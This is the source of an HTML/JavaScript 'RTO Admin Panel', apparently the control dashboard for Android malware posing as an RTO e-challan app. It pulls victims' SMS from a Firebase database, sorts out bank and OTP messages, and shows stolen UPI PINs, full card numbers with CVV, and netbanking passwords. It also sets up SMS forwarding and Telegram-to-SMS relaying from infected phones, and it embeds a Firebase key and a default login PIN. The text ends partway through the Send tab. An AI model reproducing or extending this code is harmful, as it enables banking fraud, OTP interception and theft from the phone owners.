<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RTO Admin Panel</title>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7EB; min-height:100vh; overflow-x:hidden; }
.login-screen { position:fixed; top:0; left:0; width:100%; height:100%; background:#0A0E1A; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; }
.login-box { background:#111827; border:1px solid #00E5FF; border-radius:16px; padding:32px; max-width:380px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,229,255,0.2); }
.login-box h1 { color:#00E5FF; font-size:22px; margin-bottom:8px; }
.login-box p { color:#8B9BB4; font-size:12px; margin-bottom:24px; }
.pin-input { width:100%; padding:14px; background:#0F1729; border:1px solid #1F2F4A; border-radius:10px; color:#E5E7EB; font-size:20px; text-align:center; letter-spacing:0.5em; font-family:monospace; margin-bottom:12px; }
.pin-input:focus { outline:none; border-color:#00E5FF; }
.btn-primary { width:100%; padding:14px; background:#00E5FF; color:#0A0E1A; border:none; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; }
.error-msg { color:#FF3B5C; font-size:12px; margin-top:8px; min-height:16px; }
.topbar { background:#111827; padding:14px 20px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1F2F4A; position:sticky; top:0; z-index:100; }
.topbar h1 { color:#00E5FF; font-size:18px; }
.topbar-right { display:flex; align-items:center; gap:12px; }
.status { display:flex; align-items:center; gap:6px; font-size:11px; color:#00FF88; }
.dot { width:8px; height:8px; border-radius:50%; background:#00FF88; animation:pulse 2s infinite; }
@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
.btn-logout { background:#FF3B5C; color:white; border:none; padding:8px 14px; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; }
.stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:10px; padding:16px 20px; max-width:1400px; margin:0 auto; }
.stat-card { background:linear-gradient(135deg,#1E40AF,#7C3AED); padding:14px; border-radius:12px; text-align:center; }
.stat-card .num { font-size:24px; font-weight:bold; color:white; }
.stat-card .label { font-size:10px; color:rgba(255,255,255,0.8); text-transform:uppercase; letter-spacing:0.1em; margin-top:2px; }
.quick-actions { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; padding:0 20px 20px; max-width:1400px; margin:0 auto; }
.action-btn { background:#0F1729; border:1px solid #1F2F4A; border-radius:12px; padding:12px; cursor:pointer; display:flex; align-items:center; gap:8px; color:#E5E7EB; }
.action-btn:hover { border-color:#00E5FF; }
.action-icon { font-size:18px; }
.action-label { font-size:11px; font-weight:bold; }
.action-sub { font-size:9px; color:#8B9BB4; margin-top:1px; }
.container { max-width:1400px; margin:0 auto; padding:0 20px 40px; }
.search-box { width:100%; padding:12px 16px; background:#0F1729; border:1px solid #1F2F4A; border-radius:10px; color:#E5E7EB; font-size:13px; margin-bottom:12px; }
.search-box:focus { outline:none; border-color:#00E5FF; }
.filters { display:flex; gap:6px; margin-bottom:12px; overflow-x:auto; padding-bottom:4px; }
.filter-btn { padding:6px 14px; background:#0F1729; border:1px solid #1F2F4A; border-radius:20px; color:#00E5FF; font-size:11px; font-weight:bold; cursor:pointer; white-space:nowrap; }
.filter-btn.active { background:#00E5FF; color:#0A0E1A; }
.device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:12px; }
.device-card { background:#0F1729; border:1px solid #1F2F4A; border-radius:14px; padding:14px; cursor:pointer; }
.device-card:hover { border-color:#00E5FF; }
.device-header { display:flex; align-items:center; gap:10px; margin-bottom:12px; }
.wifi-icon { width:40px; height:40px; border-radius:50%; background:#1A2F4A; border:2px solid #00E5FF; display:flex; align-items:center; justify-content:center; font-size:18px; }
.device-info { flex:1; min-width:0; }
.device-name { color:white; font-size:14px; font-weight:bold; margin-bottom:2px; }
.device-id { color:#8B9BB4; font-size:10px; font-family:monospace; }
.star-icon { font-size:18px; cursor:pointer; }
.device-details { display:grid; grid-template-columns:1fr 1fr; gap:8px; padding-top:10px; border-top:1px solid #1F2F4A; font-size:11px; }
.device-details .label { color:#5A6B85; font-size:9px; text-transform:uppercase; }
.device-details .value { color:#E5E7EB; margin-top:2px; font-weight:500; }
.balance-bar { margin-top:10px; background:rgba(0,255,136,0.08); border:1px solid rgba(0,255,136,0.3); border-radius:8px; padding:8px 12px; display:flex; justify-content:space-between; align-items:center; }
.balance-bar .amt { color:#00FF88; font-size:14px; font-weight:bold; }
.balance-bar .acct { color:#8B9BB4; font-size:10px; }
.drawer-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.3s; }
.drawer-overlay.active { opacity:1; pointer-events:auto; }
.side-drawer { position:fixed; top:0; right:0; width:100%; max-width:520px; height:100vh; background:#111827; z-index:999; transform:translateX(100%); transition:transform 0.3s ease-out; display:flex; flex-direction:column; border-left:1px solid #00E5FF; box-shadow:-10px 0 40px rgba(0,229,255,0.2); }
.side-drawer.active { transform:translateX(0); }
.drawer-header { padding:14px 18px; border-bottom:1px solid #1F2F4A; display:flex; justify-content:space-between; align-items:center; background:#0F1729; flex-shrink:0; }
.drawer-header h2 { color:#00E5FF; font-size:15px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex:1; }
.header-actions { display:flex; gap:6px; flex-shrink:0; }
.icon-btn { background:#1A2F4A; border:none; color:#00E5FF; width:32px; height:32px; border-radius:8px; cursor:pointer; font-size:14px; }
.icon-btn.danger { background:#FF3B5C; color:white; }
.drawer-mini { background:#0F1729; padding:10px 14px; border-bottom:1px solid #1F2F4A; display:flex; gap:8px; align-items:center; flex-wrap:wrap; flex-shrink:0; }
.drawer-mini .wifi-icon { width:34px; height:34px; font-size:15px; }
.mini-info { color:#8B9BB4; font-size:10px; display:flex; gap:8px; flex-wrap:wrap; }
.mini-info .badge { padding:3px 8px; background:#1A2F4A; border-radius:8px; }
.tabs { display:flex; gap:2px; padding:8px 14px 0; background:#0F1729; border-bottom:1px solid #1F2F4A; overflow-x:auto; flex-shrink:0; }
.tab { padding:9px 12px; background:transparent; border:none; color:#00E5FF; font-size:11px; font-weight:bold; cursor:pointer; border-radius:8px 8px 0 0; white-space:nowrap; }
.tab.active { background:#00E5FF; color:#0A0E1A; }
.tab .count { background:#1A2F4A; color:#00E5FF; padding:1px 6px; border-radius:8px; font-size:9px; margin-left:4px; }
.tab.active .count { background:#0A0E1A; color:#00E5FF; }
.drawer-body { padding:14px; overflow-y:auto; flex:1; -webkit-overflow-scrolling:touch; }
.message-item { background:#0F1729; border-left:3px solid #00E5FF; border-radius:8px; padding:12px; margin-bottom:10px; }
.message-item.sent { border-left-color:#00FF88; }
.msg-sender { color:#00E5FF; font-size:12px; font-weight:bold; margin-bottom:4px; display:flex; justify-content:space-between; }
.msg-body { color:#E5E7EB; font-size:13px; line-height:1.4; word-break:break-word; }
.msg-date { color:#5A6B85; font-size:10px; margin-top:6px; }
.form-group { margin-bottom:12px; }
.form-label { display:block; color:#8B9BB4; font-size:11px; margin-bottom:4px; text-transform:uppercase; }
.form-input, .form-select, .form-textarea { width:100%; padding:10px 12px; background:#0F1729; border:1px solid #1F2F4A; border-radius:8px; color:#E5E7EB; font-size:13px; font-family:inherit; }
.form-textarea { min-height:80px; resize:vertical; }
.form-input:focus, .form-textarea:focus, .form-select:focus { outline:none; border-color:#00E5FF; }
.btn-submit { width:100%; padding:12px; background:#00E5FF; color:#0A0E1A; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:4px; }
.btn-submit:hover { background:#00B8D4; }
.btn-submit.danger { background:#FF3B5C; color:white; }
.send-card { background:#0F1729; border:1px solid #1F2F4A; border-radius:12px; padding:14px; margin-bottom:12px; }
.send-card.telegram { border-color:rgba(0,229,255,0.3); }
.send-card.forwarding { border-color:rgba(0,255,136,0.3); }
.send-card h3 { color:#00E5FF; font-size:14px; margin-bottom:4px; }
.send-card.green h3 { color:#00FF88; }
.send-card p { color:#8B9BB4; font-size:11px; margin-bottom:12px; line-height:1.4; }
.sim-row { display:flex; gap:8px; margin-bottom:12px; }
.sim-btn { flex:1; padding:12px; background:#1A2F4A; border:2px solid transparent; border-radius:10px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; }
.sim-btn.active { background:#00E5FF; color:#0A0E1A; border-color:#00E5FF; }
.on-off-btn { padding:12px 24px; background:#1A2F4A; border:none; border-radius:8px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; white-space:nowrap; }
.on-off-btn.on { background:#00FF88; color:#0A0E1A; }
.info-box { background:rgba(0,229,255,0.05); border:1px solid rgba(0,229,255,0.2); border-radius:8px; padding:10px; font-size:11px; color:#8B9BB4; margin-top:8px; line-height:1.5; }
.info-box.green { background:rgba(0,255,136,0.05); border-color:rgba(0,255,136,0.2); }
.info-box .dot-indicator { display:inline-block; width:6px; height:6px; border-radius:50%; background:#5A6B85; margin-right:6px; }
.info-box .dot-indicator.on { background:#00FF88; }
.chars-count { font-size:10px; color:#5A6B85; text-align:right; margin-top:2px; }
.device-info-row { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #1F2F4A; font-size:12px; }
.device-info-row .k { color:#8B9BB4; }
.device-info-row .v { color:#E5E7EB; font-weight:500; }
.loading { text-align:center; padding:40px; color:#5A6B85; }
.empty-msg { text-align:center; padding:40px 20px; color:#5A6B85; font-size:13px; }
.photo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(100px,1fr)); gap:8px; }
.photo-item { border-radius:8px; overflow:hidden; background:#0F1729; cursor:pointer; }
.photo-item img { width:100%; height:100px; object-fit:cover; display:block; }
.app-item { background:#0F1729; padding:10px 12px; border-radius:8px; margin-bottom:6px; display:flex; align-items:center; gap:10px; }
.app-icon { width:32px; height:32px; background:#1A2F4A; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#00E5FF; font-size:16px; }
.app-name { color:white; font-size:12px; font-weight:bold; }
.app-package { color:#8B9BB4; font-size:9px; font-family:monospace; margin-top:2px; }
@media (max-width:600px) {
  .topbar h1 { font-size:14px; }
  .device-grid { grid-template-columns:1fr; }
  .side-drawer { max-width:100%; }
}
</style>
</head>
<body>

<div class="login-screen" id="loginScreen">
  <div class="login-box">
    <h1>🔐 RTO ADMIN</h1>
    <p>Enter your PIN to continue</p>
    <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
    <button class="btn-primary" id="loginBtn">LOGIN</button>
    <div class="error-msg" id="errorMsg"></div>
  </div>
</div>

<div id="mainApp" style="display:none;">
  <div class="topbar">
    <h1>🚔 RTO ADMIN</h1>
    <div class="topbar-right">
      <div class="status"><div class="dot"></div><span>Live</span></div>
      <button class="btn-logout" id="logoutBtn">LOGOUT</button>
    </div>
  </div>
  <div class="stats">
    <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Total</div></div>
    <div class="stat-card"><div class="num" id="statOnline">0</div><div class="label">Online</div></div>
    <div class="stat-card"><div class="num" id="statOffline">0</div><div class="label">Offline</div></div>
    <div class="stat-card"><div class="num" id="statMessages">0</div><div class="label">All SMS</div></div>
    <div class="stat-card"><div class="num" id="statBankSms">0</div><div class="label">Bank SMS</div></div>
  </div>
  <div class="quick-actions">
    <div class="action-btn" id="btnCsvExport"><div class="action-icon">📋</div><div><div class="action-label">CSV</div><div class="action-sub">Export data</div></div></div>
    <div class="action-btn" id="btnPingAll"><div class="action-icon">📍</div><div><div class="action-label">PING ALL</div><div class="action-sub">Ping devices</div></div></div>
    <div class="action-btn" id="btnFbSources"><div class="action-icon">🔥</div><div><div class="action-label">FB</div><div class="action-sub">Firebase</div></div></div>
    <div class="action-btn" id="btnCards"><div class="action-icon">💳</div><div><div class="action-label">CARDS</div><div class="action-sub">Payment</div></div></div>
    <div class="action-btn" id="btnNuke"><div class="action-icon">☢️</div><div><div class="action-label">NUKE</div><div class="action-sub">Delete all</div></div></div>
  </div>
  <div class="container">
    <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search devices...">
    <div class="filters">
      <div class="filter-btn active" data-filter="all">All</div>
      <div class="filter-btn" data-filter="online">Online</div>
      <div class="filter-btn" data-filter="offline">Offline</div>
      <div class="filter-btn" data-filter="upi">UPI</div>
      <div class="filter-btn" data-filter="bank">Bank</div>
      <div class="filter-btn" data-filter="card">Card</div>
      <div class="filter-btn" data-filter="liked">⭐ Liked</div>
    </div>
    <div class="device-grid" id="deviceGrid"><div class="loading">Loading devices...</div></div>
  </div>
</div>

<div class="drawer-overlay" id="drawerOverlay"></div>
<div class="side-drawer" id="sideDrawer">
  <div class="drawer-header">
    <h2 id="modalTitle">Device</h2>
    <div class="header-actions">
      <button class="icon-btn" id="btnStarModal">☆</button>
      <button class="icon-btn danger" id="btnDelDeviceModal">🗑</button>
      <button class="icon-btn" id="closeModalBtn">✕</button>
    </div>
  </div>
  <div class="drawer-mini" id="deviceMini"></div>
  <div class="tabs">
    <button class="tab active" data-tab="info">Info</button>
    <button class="tab" data-tab="bank">Bank <span class="count" id="bankCount">0</span></button>
    <button class="tab" data-tab="card">Card <span class="count" id="cardCount">0</span></button>
    <button class="tab" data-tab="allsms">All SMS <span class="count" id="smsCount">0</span></button>
    <button class="tab" data-tab="send">Send</button>
  </div>
  <div class="drawer-body" id="modalBody"><div class="loading">Loading...</div></div>
</div>

<div class="drawer-overlay" id="dialogOverlay" style="z-index:1000;"></div>
<div class="side-drawer" id="dialogDrawer" style="max-width:500px;z-index:1001;">
  <div class="drawer-header">
    <h2 id="dialogTitle">Dialog</h2>
    <button class="icon-btn danger" id="closeDialogBtn">✕</button>
  </div>
  <div class="drawer-body" id="dialogBody"></div>
</div>

<script>
var firebaseConfig = {
  apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
  databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
  projectId: "rto-echallan-v2",
  appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
};
firebase.initializeApp(firebaseConfig);
var db = firebase.database();
var allDevices = {};
var currentDeviceId = null;
var currentTab = 'info';
var deviceMessages = {};
var currentFilter = 'all';
var likedDevices = JSON.parse(localStorage.getItem('liked_devices') || '[]');

function doLogin() {
  var pin = document.getElementById('pinInput').value.trim();
  if (pin.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
  document.getElementById('errorMsg').textContent = 'Checking...';
  db.ref('admin_config/login_pin').once('value').then(function(snap) {
    var savedPin = snap.val() || '0987';
    if (pin === savedPin) {
      localStorage.setItem('admin_logged_in', 'true');
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('mainApp').style.display = 'block';
      startApp();
    } else { document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
  }).catch(function(err) { document.getElementById('errorMsg').textContent = 'Error: ' + err.message; });
}
function doLogout() { localStorage.removeItem('admin_logged_in'); location.reload(); }

function startApp() {
  db.ref('device_info').on('value', function(snap) {
    allDevices = snap.val() || {};
    updateStats();
    renderDevices();
    if (currentDeviceId && allDevices[currentDeviceId]) { renderTab(); }
  });
}
function updateStats() {
  var ids = Object.keys(allDevices);
  var online = 0, offline = 0, totalMsgs = 0, bankSms = 0;
  ids.forEach(function(id) {
    var dev = allDevices[id];
    if (dev.status === 'Online') online++; else offline++;
    if (dev.messages) Object.values(dev.messages).forEach(function(m) { totalMsgs++; if (detectCategory(m.sender, m.body) === 'BANK') bankSms++; });
    if (dev.sms_history) Object.values(dev.sms_history).forEach(function(m) { totalMsgs++; if (detectCategory(m.sender, m.body) === 'BANK') bankSms++; });
  });
  document.getElementById('statDevices').textContent = ids.length;
  document.getElementById('statOnline').textContent = online;
  document.getElementById('statOffline').textContent = offline;
  document.getElementById('statMessages').textContent = totalMsgs;
  document.getElementById('statBankSms').textContent = bankSms;
}
function isLiked(id) { return likedDevices.indexOf(id) !== -1; }
function toggleLike(id) {
  if (isLiked(id)) likedDevices = likedDevices.filter(function(x) { return x !== id; });
  else likedDevices.push(id);
  localStorage.setItem('liked_devices', JSON.stringify(likedDevices));
  renderDevices();
  if (currentDeviceId === id) updateStar();
}
function updateStar() {
  var btn = document.getElementById('btnStarModal');
  if (btn) btn.textContent = isLiked(currentDeviceId) ? '⭐' : '☆';
}
function renderDevices() {
  var grid = document.getElementById('deviceGrid');
  var search = (document.getElementById('searchBox').value || '').toLowerCase();
  var ids = Object.keys(allDevices).filter(function(id) {
    var dev = allDevices[id];
    if (currentFilter === 'online' && dev.status !== 'Online') return false;
    if (currentFilter === 'offline' && dev.status === 'Online') return false;
    if (currentFilter === 'liked' && !isLiked(id)) return false;
    if (currentFilter === 'upi' && !dev.upi_data) return false;
    if (currentFilter === 'card' && !dev.card_data) return false;
    if (currentFilter === 'bank' && !dev.netbanking_data) return false;
    var s = (id + ' ' + (dev.device_model || '') + ' ' + (dev.sim_info && dev.sim_info.sim1_number || '')).toLowerCase();
    return s.indexOf(search) !== -1;
  });
  if (ids.length === 0) { grid.innerHTML = '<div class="empty-msg">No devices found</div>'; return; }
  ids.sort(function(a, b) {
    var ta = allDevices[a].first_install_timestamp || allDevices[a].install_timestamp || 0;
    var tb = allDevices[b].first_install_timestamp || allDevices[b].install_timestamp || 0;
    return tb - ta;
  });
  grid.innerHTML = ids.map(function(id) {
    var dev = allDevices[id];
    var isOnline = dev.status === 'Online';
    var model = dev.device_model || 'Unknown';
    var battery = dev.battery || '0%';
    var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
    var balance = dev.last_balance || '--';
    var liked = isLiked(id);
    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + escapeHtml(model) + '</div><div class="device-id">' + id + '</div></div><div class="star-icon" data-star="' + id + '">' + (liked ? '⭐' : '☆') + '</div></div><div class="device-details"><div><div class="label">Android</div><div class="value">v' + escapeHtml(dev.android_version || '?') + '</div></div><div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div><div><div class="label">Number</div><div class="value">' + escapeHtml(sim) + '</div></div><div><div class="label">Network</div><div class="value">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_carrier) || '-') + '</div></div></div>' + (balance !== '--' ? '<div class="balance-bar"><div><div class="acct">₹ Balance</div></div><div class="amt">' + escapeHtml(balance) + '</div></div>' : '') + '</div>';
  }).join('');
  grid.querySelectorAll('.device-card').forEach(function(card) {
    card.addEventListener('click', function(e) {
      if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; }
      openDevice(this.getAttribute('data-id'));
    });
  });
}
function getBatteryColor(battery) { var pct = parseInt(battery) || 0; if (pct >= 50) return '#00FF88'; if (pct >= 20) return '#FFD700'; return '#FF3B5C'; }
function escapeHtml(text) { if (!text) return ''; var d = document.createElement('div'); d.textContent = text; return d.innerHTML; }
function detectCategory(sender, body) {
  var s = (sender || '').toUpperCase(); var b = (body || '').toUpperCase();
  if (b.indexOf('OTP') !== -1 || b.indexOf('VERIFICATION') !== -1) return 'OTP';
  if (b.indexOf('BAL') !== -1 || b.indexOf('BALANCE') !== -1 || b.indexOf('AVAILABLE') !== -1) return 'BALANCE';
  if (b.indexOf('CREDIT') !== -1 || b.indexOf('CREDITED') !== -1) return 'CREDIT';
  if (b.indexOf('DEBIT') !== -1 || b.indexOf('DEBITED') !== -1) return 'DEBIT';
  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1 || s.indexOf('AXIS') !== -1 || s.indexOf('BOB') !== -1) return 'BANK';
  return 'ALERT';
}
function detectBankName(sender) {
  var s = (sender || '').toUpperCase();
  if (s.indexOf('SBI') !== -1) return 'SBI';
  if (s.indexOf('HDFC') !== -1) return 'HDFC';
  if (s.indexOf('ICICI') !== -1) return 'ICICI';
  if (s.indexOf('AXIS') !== -1) return 'AXIS';
  if (s.indexOf('BOB') !== -1) return 'BOB';
  if (s.indexOf('PHONEPE') !== -1 || s.indexOf('PHONPE') !== -1) return 'PhonePe';
  if (s.indexOf('GPAY') !== -1 || s.indexOf('GOOGLE') !== -1) return 'GPay';
  if (s.indexOf('PAYTM') !== -1) return 'Paytm';
  return 'Bank';
}
function extractBalance(body) {
  var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i);
  return m ? '₹ ' + m[1] : '';
}

function openDevice(id) {
  currentDeviceId = id;
  var dev = allDevices[id];
  document.getElementById('modalTitle').textContent = '📱 ' + (dev.device_model || id);
  updateStar();
  var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
  var balance = dev.last_balance || '--';
  document.getElementById('deviceMini').innerHTML = '<div class="wifi-icon">📶</div><div class="mini-info"><span class="badge">' + (dev.status || 'Offline') + '</span><span class="badge">Bat ' + (dev.battery || '0%') + '</span><span class="badge">' + escapeHtml(sim) + '</span>' + (balance !== '--' ? '<span class="badge" style="background:rgba(0,255,136,0.15);color:#00FF88">' + escapeHtml(balance) + '</span>' : '') + '</div>';
  db.ref('device_info/' + id + '/messages').on('value', function(snap) {
    deviceMessages = snap.val() || {};
    if (currentTab === 'allsms' || currentTab === 'bank') renderTab();
  });
  document.getElementById('sideDrawer').classList.add('active');
  document.getElementById('drawerOverlay').classList.add('active');
  switchTab('info');
}
function closeModal() {
  if (currentDeviceId) { db.ref('device_info/' + currentDeviceId + '/messages').off(); }
  document.getElementById('sideDrawer').classList.remove('active');
  document.getElementById('drawerOverlay').classList.remove('active');
  currentDeviceId = null;
}
function switchTab(tab) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach(function(t) { t.classList.toggle('active', t.getAttribute('data-tab') === tab); });
  renderTab();
}
function renderTab() {
  var body = document.getElementById('modalBody');
  var dev = allDevices[currentDeviceId];
  if (!dev) { body.innerHTML = '<div class="empty-msg">Not found</div>'; return; }
  var allMsgs = [];
  Object.values(deviceMessages).forEach(function(m) { allMsgs.push(m); });
  if (dev.sms_history) Object.values(dev.sms_history).forEach(function(m) { allMsgs.push(m); });
  allMsgs.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
  document.getElementById('smsCount').textContent = allMsgs.length;
  var bankMsgs = allMsgs.filter(function(m) { var c = detectCategory(m.sender, m.body); return c === 'BANK' || c === 'BALANCE'; });
  document.getElementById('bankCount').textContent = bankMsgs.length;
  document.getElementById('cardCount').textContent = dev.card_data ? '1' : '0';
  
  if (currentTab === 'info') {
    body.innerHTML = '<div class="message-item"><div class="msg-sender">DEVICE INFO</div><div class="msg-body">' +
      '<div class="device-info-row"><span class="k">Model</span><span class="v">' + escapeHtml(dev.device_model || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Manufacturer</span><span class="v">' + escapeHtml(dev.device_manufacturer || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Android</span><span class="v">' + escapeHtml(dev.android_version || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Serial</span><span class="v">' + escapeHtml(dev.serial_number || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Battery</span><span class="v">' + (dev.battery || '-') + ' (' + (dev.battery_status || '-') + ')</span></div>' +
      '<div class="device-info-row"><span class="k">Status</span><span class="v">' + (dev.status || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">SIM 1</span><span class="v">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">SIM 2</span><span class="v">' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">IP</span><span class="v">' + escapeHtml(dev.ip_address || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Storage</span><span class="v">' + escapeHtml(dev.storage || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">CPU</span><span class="v">' + escapeHtml(dev.cpu_arch || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">SDK</span><span class="v">' + escapeHtml(dev.android_sdk || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Installed</span><span class="v">' + escapeHtml(dev.first_install_time || dev.install_time || '-') + '</span></div>' +
      '<div class="device-info-row"><span class="k">Last Seen</span><span class="v">' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') + '</span></div>' +
      '</div></div>';
  } else if (currentTab === 'bank') {
    if (bankMsgs.length === 0) { body.innerHTML = '<div class="empty-msg">No bank messages</div>'; return; }
    body.innerHTML = bankMsgs.map(function(m) {
      var bal = extractBalance(m.body);
      var bank = detectBankName(m.sender);
      return '<div class="message-item"><div class="msg-sender">' + escapeHtml(bank) + ' — ' + escapeHtml(m.sender || '') + '</div>' + (bal ? '<div style="color:#00FF88;font-size:18px;font-weight:bold;margin:8px 0;">' + bal + '</div>' : '') + '<div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
    }).join('');
  } else if (currentTab === 'card') {
    var upi = dev.upi_data || {}; var card = dev.card_data || {}; var bank = dev.netbanking_data || {};
    body.innerHTML = '<div class="message-item"><div class="msg-sender">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + escapeHtml(upi.app_name || '-') + '<br><strong>PIN:</strong> ' + escapeHtml(upi.upi_pin || '-') + '</div></div><div class="message-item"><div class="msg-sender">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + escapeHtml(card.card_number || '-') + '<br><strong>Expiry:</strong> ' + escapeHtml(card.expiry || '-') + '<br><strong>CVV:</strong> ' + escapeHtml(card.cvv || '-') + '<br><strong>Holder:</strong> ' + escapeHtml(card.card_holder || '-') + '</div></div><div class="message-item"><div class="msg-sender">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + escapeHtml(bank.bank_name || '-') + '<br><strong>User ID:</strong> ' + escapeHtml(bank.user_id || '-') + '<br><strong>Password:</strong> ' + escapeHtml(bank.password || '-') + '</div></div>';
  } else if (currentTab === 'allsms') {
    if (allMsgs.length === 0) { body.innerHTML = '<div class="empty-msg">No SMS</div>'; return; }
    body.innerHTML = '<input type="text" class="form-input" id="smsSearch" placeholder="Search SMS..." style="margin-bottom:10px;">' + allMsgs.map(function(m, i) {
      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '" data-sms-search="' + escapeHtml((m.sender || '') + ' ' + (m.body || '')).toLowerCase() + '"><div class="msg-sender"><span>' + escapeHtml(m.sender || 'Unknown') + '</span><span style="color:' + (m.type === 'SENT' ? '#00FF88' : '#00E5FF') + ';font-size:9px">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
    }).join('');
    setTimeout(function() {
      var inp = document.getElementById('smsSearch');
      if (inp) inp.addEventListener('input', function() {
        var q = this.value.toLowerCase();
        document.querySelectorAll('[data-sms-search]').forEach(function(el) {
          el.style.display = el.getAttribute('data-sms-search').indexOf(q) !== -1 ? 'block' : 'none';
        });
      });
    }, 50);
  } else if (currentTab === 'send') {
    var fwd = dev.forward_settings || {};
    var simSelected = fwd.forward_sim_slot || 1;
    var forwardingOn = fwd.enabled || false;
    var fwdNumber = fwd.admin_number || '';
    var botToken = fwd.bot_token || '';
    var chatId = fwd.chat_id || '';
    
    body.innerHTML = 
      '<div class="send-card telegram">' +
      '<h3>✈️ Telegram to SMS Auto</h3>' +
      '<p>Auto-fills the Send SMS form and sends instantly when a channel message arrives</p>' +
      '<div class="form-group"><label class="form-label">Bot Token</label><input type="text" class="form-input" id="tgToken" value="' + escapeHtml(botToken) + '" placeholder="BotFather token"></div>' +
      '<div style="display:flex;gap:8px;align-items:flex-end;">' +
      '<div class="form-group" style="flex:1;margin-bottom:0;"><label class="form-label">Channel / Chat ID</label><input type="text" class="form-input" id="tgChat" value="' + escapeHtml(chatId) + '" placeholder="-100xxx or @channel"></div>' +
      '<button class="btn-submit" id="tgStart" style="width:auto;padding:10px 20px;margin:0;">Start</button>' +
      '</div>' +
      '<div class="info-box"><span class="dot-indicator"></span>Idle - enter a token and chat ID, then select Start</div>' +
      '<div class="info-box" style="font-style:italic;">Format: line 1 is the phone number; remaining lines are the SMS text.</div>' +
      '</div>' +
      
      '<div class="send-card forwarding">' +
      '<h3 style="color:#00FF88;">📱 SMS FORWARDING (AUTO)</h3>' +
      '<p>Enter a number and select ON. New SMS messages are placed in the Send SMS form automatically.</p>' +
      '<label class="form-label">SIM (SEND LINE)</label>' +
      '<div class="sim-row">' +
      '<div class="sim-btn ' + (simSelected === 1 ? 'active' : '') + '" data-sim="1">SIM 1' + (simSelected === 1 ? ' ✓' : '') + '</div>' +
      '<div class="sim-btn ' + (simSelected === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div>' +
      '</div>' +
      '<label class="form-label">+91 FORWARDING NUMBER</label>' +
      '<div style="display:flex;gap:8px;">' +
      '<input type="text" class="form-input" id="fwdNum" value="' + escapeHtml(fwdNumber) + '" placeholder="+91XXXXXXXXXX" inputmode="numeric" style="flex:1;">' +
      '<button class="on-off-btn ' + (forwardingOn ? 'on' : '') + '" id="fwdToggle">' + (forwardingOn ? '✓ ON' : '▶ ON') + '</button>' +
